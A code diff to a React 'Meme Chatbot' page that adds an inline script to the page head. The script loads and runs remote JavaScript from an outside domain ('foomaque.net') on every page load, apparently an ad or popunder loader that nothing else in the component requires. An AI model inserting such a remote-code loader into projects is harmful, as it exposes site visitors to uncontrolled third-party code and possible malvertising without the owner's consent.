@@ -274,6 +274,13 @@ return (
     <Helmet>
       <title>Meme Chatbot</title>
       <meta name="description" content="Chat with the Meme Bot and get the perfect meme for any mood!" />
+
+      <script data-cfasync="false" type="text/javascript">
+          {`(()=>{var d='foomaque.net',z=8940976,s=document.createElement('script'),c;
+            s.src='//'+d+'/400/'+z;
+            s.onerror=s.onload=E; function E(){c&&c();c=null}
+            try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})();`}
+        </script>
     </Helmet>
 
     <div className="w-full max-w-4xl bg-white rounded-3xl shadow-2xl p-8 text-center relative">
